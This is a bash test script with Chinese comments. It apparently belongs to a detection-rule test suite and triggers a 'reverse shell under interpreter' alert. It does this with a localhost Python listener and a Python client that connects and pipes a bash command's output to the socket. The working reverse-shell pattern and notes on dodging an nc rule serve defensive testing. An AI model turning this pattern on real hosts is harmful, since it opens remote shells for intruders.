#!/bin/bash
# 用例 07 反弹 shell（解释器派生）：python 反弹连接本地监听并派生 bash
# 预期：alerts 出现 dsl.exec_reverse_shell_under_interpreter（bash 祖先链含 python3）
# 注意：监听端用 python（不用 nc），避免 nc 的 exec 触发 dual_use 规则、
# 10s 节流窗口内把 case-08 的告警挤掉（节流按 rule_id 全局生效）。
source "$(dirname "$0")/../lib.sh"
tag="${1:-case-07-r1}"
mark_begin "$tag"

PORT=4407
python3 -c "
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', $PORT))
s.listen(1)
s.settimeout(8)
try:
    conn, _ = s.accept()
    conn.recv(1024)
except socket.timeout:
    pass
" >/dev/null 2>&1 &
L_PID=$!
sleep 0.5
timeout 5 python3 -c "
import socket, subprocess
s = socket.socket()
s.connect(('127.0.0.1', $PORT))
subprocess.run(['/bin/bash', '-c', 'id'], stdout=s.fileno(), stderr=s.fileno())
" >/dev/null 2>&1
kill $L_PID 2>/dev/null
exit 0
